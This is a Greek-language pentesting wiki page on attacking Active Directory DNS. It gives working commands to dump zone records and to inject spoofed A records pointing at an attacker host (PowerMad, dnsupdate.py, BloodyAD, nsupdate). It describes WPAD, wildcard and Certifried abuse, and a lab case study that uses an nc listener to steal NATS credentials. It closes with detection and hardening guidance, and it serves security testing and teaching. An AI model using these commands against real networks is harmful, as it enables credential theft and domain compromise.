# Εγγραφές DNS του AD

{{#include ../../banners/hacktricks-training.md}}

Από προεπιλογή, **κάθε χρήστης** στο Active Directory μπορεί να **απαριθμήσει όλες τις εγγραφές DNS** στις ζώνες DNS του Domain ή του Forest, όπως σε μια μεταφορά ζώνης (οι χρήστες μπορούν να παραθέσουν τα θυγατρικά αντικείμενα μιας ζώνης DNS σε περιβάλλον AD).

Το εργαλείο [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) επιτρέπει την **απαρίθμηση** και την **εξαγωγή** **όλων των εγγραφών DNS** στη ζώνη, για σκοπούς αναγνώρισης εσωτερικών δικτύων.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (Απρίλιος 2025) προσθέτει έξοδο JSON/Greppable (`--json`), πολυνηματική επίλυση DNS και υποστήριξη TLS 1.2/1.3 κατά τη σύνδεση σε LDAPS  

Για περισσότερες πληροφορίες, διαβάστε το [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Δημιουργία / Τροποποίηση εγγραφών (ADIDNS spoofing)

Επειδή η ομάδα **Authenticated Users** έχει από προεπιλογή δικαίωμα **Create Child** στο DACL της ζώνης, οποιοσδήποτε λογαριασμός τομέα (ή υπολογιστή) μπορεί να καταχωρίσει πρόσθετες εγγραφές. Αυτό μπορεί να χρησιμοποιηθεί για υποκλοπή κίνησης, εξαναγκασμό σε NTLM relay ή ακόμη και για πλήρη παραβίαση του τομέα.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(Το dnsupdate.py περιλαμβάνεται στο Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Συνήθεις primitives επίθεσης

1. **Wildcard record** – Το `*.<zone>` μετατρέπει τον AD DNS server σε responder για ολόκληρη την επιχείρηση, παρόμοιο με spoofing LLMNR/NBNS. Μπορεί να χρησιμοποιηθεί για την καταγραφή NTLM hashes ή για την αναμετάδοσή τους σε LDAP/SMB.  (Απαιτείται να είναι απενεργοποιημένο το WINS-lookup.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – προσθέστε `wpad` (ή ένα record **NS** που δείχνει σε host του attacker, ώστε να παρακαμφθεί το Global-Query-Block-List) και κάντε διαφανές proxying των εξερχόμενων HTTP requests για να συλλέξετε credentials. Η Microsoft διόρθωσε τις παρακάμψεις wildcard/DNAME (CVE-2018-8320), αλλά τα **NS-records εξακολουθούν να λειτουργούν**.<sup>[[1]](#references)</sup>    
3. **Stale entry takeover** – διεκδικήστε τη διεύθυνση IP που ανήκε προηγουμένως σε έναν workstation, και η σχετική DNS entry θα εξακολουθήσει να επιλύεται, επιτρέποντας επιθέσεις resource-based constrained delegation ή Shadow-Credentials χωρίς να αγγίξετε καθόλου το DNS.    
4. **DHCP → DNS spoofing** – σε μια προεπιλεγμένη εγκατάσταση Windows DHCP+DNS, ένας μη πιστοποιημένος attacker στο ίδιο subnet μπορεί να αντικαταστήσει οποιοδήποτε υπάρχον A record (συμπεριλαμβανομένων των Domain Controllers), στέλνοντας πλαστά DHCP requests που ενεργοποιούν dynamic DNS updates (Akamai “DDSpoof”, 2023). Αυτό επιτρέπει machine-in-the-middle επιθέσεις μέσω Kerberos/LDAP και μπορεί να οδηγήσει σε πλήρη ανάληψη του domain.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – αλλάξτε το `dNSHostName` ενός machine account που ελέγχετε, καταχωρίστε ένα αντίστοιχο A record και, στη συνέχεια, ζητήστε certificate για αυτό το όνομα ώστε να υποδυθείτε τον DC. Εργαλεία όπως τα **Certipy** ή **BloodyAD** αυτοματοποιούν πλήρως τη διαδικασία.  

Ένα AD DNS record με [serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) μπορεί να αποτελέσει μέρος μιας αλυσιδωτής conditional relay επίθεσης: ο caller χρειάζεται δικαιώματα δημιουργίας record, ένα μονοπάτι coercion που κάνει τον target computer να πιστοποιηθεί σε αυτό το όνομα, και έναν προορισμό relay που αποδέχεται την προκύπτουσα πιστοποίηση. Αξιολογήστε ξεχωριστά το πρωτόκολλο προορισμού· το SMB signing στην εισερχόμενη σύνδεση δεν καθορίζει από μόνο του αν ένας προορισμός HTTPS WinRM αποδέχεται το relay. Το επίπεδο ενημερώσεων κώδικα, ο χειρισμός ονομάτων, το Extended Protection και η διαμόρφωση της υπηρεσίας μπορούν να επηρεάσουν το αποτέλεσμα.

---

### Παραβίαση εσωτερικής υπηρεσίας μέσω παρωχημένων dynamic records (μελέτη περίπτωσης NATS)

Όταν τα dynamic updates παραμένουν διαθέσιμα σε όλους τους πιστοποιημένους χρήστες, **ένα όνομα υπηρεσίας που έχει καταργηθεί από την καταχώριση μπορεί να διεκδικηθεί ξανά και να κατευθυνθεί σε υποδομή του attacker**. Ο DC Mirage HTB αποκάλυψε το hostname `nats-svc.mirage.htb` μετά το DNS scavenging, επομένως οποιοσδήποτε χρήστης με χαμηλά προνόμια μπορούσε να:<sup>[[3]](#references)</sup>

1. **Επιβεβαιώσει ότι λείπει το record** και να μάθει το SOA με `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Επαναδημιουργήστε την εγγραφή προς μια εξωτερική διεπαφή/VPN που ελέγχουν:**

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Προσποιηθείτε την υπηρεσία plaintext**. Οι clients του NATS αναμένουν να δουν ένα banner `INFO { ... }` πριν στείλουν credentials, επομένως αρκεί να αντιγράψετε ένα νόμιμο banner από τον πραγματικό broker για να συλλέξετε μυστικά:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Οποιοσδήποτε client επιλύσει το παραβιασμένο όνομα θα διαρρεύσει αμέσως το JSON `CONNECT` frame του (συμπεριλαμβανομένων των `"user"`/`"pass"`) στον listener. Η εκτέλεση του επίσημου binary `nats-server -V` στον host του attacker, η απενεργοποίηση της απόκρυψης δεδομένων στα logs του ή απλώς η παρακολούθηση της session με το Wireshark αποκαλύπτει τα ίδια credentials σε plaintext, επειδή το TLS ήταν προαιρετικό.

4. **Pivot με τα captured creds** – στο Mirage, ο κλεμμένος λογαριασμός NATS παρείχε πρόσβαση στο JetStream, το οποίο αποκάλυψε ιστορικά authentication events που περιείχαν επαναχρησιμοποιήσιμα AD usernames/passwords.

Αυτό το μοτίβο ισχύει για κάθε υπηρεσία ενσωματωμένη στο AD που βασίζεται σε μη ασφαλή TCP handshakes (HTTP APIs, RPC, MQTT κ.λπ.): μόλις παραβιαστεί η εγγραφή DNS, ο attacker γίνεται η υπηρεσία.
Για την απαρίθμηση από την πλευρά του broker και τη ροή εργασιών με retained messages, δείτε το [NATS / JetStream pentesting](../../network-services-pentesting/4222-pentesting-nats.md).

---

## Εντοπισμός & σκλήρυνση

* Αφαιρέστε από το **Authenticated Users** το δικαίωμα *Create all child objects* σε ευαίσθητες ζώνες και αναθέστε τις dynamic updates σε έναν ειδικό λογαριασμό που χρησιμοποιείται από το DHCP.
* Αν απαιτούνται dynamic updates, ορίστε τη ζώνη σε **Secure-only** και ενεργοποιήστε το **Name Protection** στο DHCP, ώστε μόνο το αντικείμενο υπολογιστή του owner να μπορεί να αντικαταστήσει τη δική του εγγραφή.
* Παρακολουθείτε τα DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) και τις εγγραφές LDAP στο `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Αποκλείστε επικίνδυνα ονόματα (`wpad`, `isatap`, `*`) με μια σκόπιμα αβλαβή εγγραφή ή μέσω της Global Query Block List.
* Διατηρείτε τους DNS servers ενημερωμένους με patches – π.χ., τα RCE bugs CVE-2024-26224 και CVE-2024-26231 έφτασαν σε **CVSS 9.8** και μπορούν να αξιοποιηθούν απομακρυσμένα εναντίον Domain Controllers.  



## References

- [1] [Το ADIDNS ξανά: WPAD, GQBL και άλλα](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Πλαστογράφηση εγγραφών DNS μέσω κατάχρησης των dynamic updates DNS του DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Συνδυασμός διαρροών NFS, κατάχρησης Dynamic DNS, κλοπής NATS credentials, μυστικών JetStream και Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Μπαίνοντας στη ζώνη: εξαγωγή DNS του Active Directory με το adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
